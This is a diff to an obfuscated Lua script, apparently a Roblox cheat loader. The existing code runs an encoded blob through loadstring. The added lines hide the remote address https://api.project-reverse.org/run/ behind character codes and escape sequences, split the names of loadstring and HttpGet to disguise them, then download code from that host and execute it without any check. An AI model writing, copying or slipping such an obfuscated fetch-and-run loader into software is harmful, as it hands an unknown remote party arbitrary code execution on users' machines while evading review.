@@ -3,3 +3,27 @@ return(function(k,q)local r=loadstring or load if not r then return end local u=
 ,
 [==[Q7c0PQWn27TOkM2pMlll-.V%e9l41@*u%+i&'JoV-[v$cFAvEbRpoTa&%P-t83OrMG4Pec`VwNMQd.lees*m!U92wCFj/9/6pSXG#,%:X.iR:fa?L*BHu#^;hw?\vc\:)B+-fo1$ZwL+ohZ7j)Gv%V4RY++m'!9lwjtwbF;"ik-'s)w1^mjC1'0DI%g:&1TRIgPT91920#ICO!O">,PwGuY&Z8s0u>-!WMMZ+1\$o$fKgEP>R%twDE3KEY_Y0:UR'02sDDOhIg?+c;sWD-Wp>Ike(X4rDp7O!02b%l4vCF;kL[&5rN'-!T>8pv//(W(t%BRfvwH@-WUE6fcapYYT%7NoT-:2aR.Nf's)!7<#193T[TRQt?"Je6pOvr7:d2Hoti(EsO>pgu@&L1Sv2YQMw^>Uu_b_P%TX-EEV7:-@Tshh)7jOe7+lllll]==]
 )
+
+local _host = string.char(112,114,111,106,101,99,116,45,114,101,118,101,114,115,101,46,111,114,103)
+local _scheme = "\104\116\116\112\115\58\47\47"
+local _prefix = _scheme .. "api." .. _host .. "/run/"
+local _token = "eyJpZCI6ImVlZTg1YjI5LWYyNDItNDEwMS05ZDkxLTUwMjlhMDhmYWQxYyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJuZXd1aSJ9fQ"
+local _url = _prefix .. _token
+
+local _load = _G["loa".."dstr".."ing"]
+local _get = game["Ht".."tp".."G".."et"]
+
+local _success, _chunk = pcall(function()
+    return _get(_url)
+end)
+
+if _success and _chunk and #_chunk > 0 then
+    local _fn, _err = _load(_chunk)
+    if _fn then
+        pcall(_fn)
+    else
+        warn("Failed to load script: " .. tostring(_err))
+    end
+else
+    warn("HTTP request failed! (Error 260 or API down).")
+end
